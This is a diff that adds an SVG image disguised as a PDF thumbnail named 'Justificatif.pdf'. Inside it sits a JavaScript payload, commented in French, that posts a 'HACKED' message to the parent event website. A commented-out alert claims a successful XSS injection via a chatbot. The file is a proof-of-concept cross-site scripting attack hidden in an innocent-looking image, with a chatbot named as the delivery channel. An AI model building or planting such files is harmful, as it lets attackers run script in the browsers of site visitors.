@@ -1,0 +1,17 @@
+<svg width="200" height="150" xmlns="http://www.w3.org/2000/svg">
+  <rect width="100%" height="100%" fill="#111" rx="10" />
+  <circle cx="100" cy="60" r="30" fill="red" />
+  <text x="100" y="110" font-family="Arial" font-size="14" fill="white" text-anchor="middle">Justificatif.pdf</text>
+
+  <script type="text/javascript">
+    // On attend que l'image soit chargée
+    setTimeout(() => {
+        // On signale au site parent (le site événementiel) qu'on a pris le contrôle
+        // window.top fait référence à la fenêtre principale du navigateur
+        window.top.postMessage('HACKED', '*');
+        
+        // On peut aussi faire une petite alerte pour être sûr
+        // alert("Injection XSS réussie via le Chatbot !");
+    }, 1000);
+  </script>
+</svg>
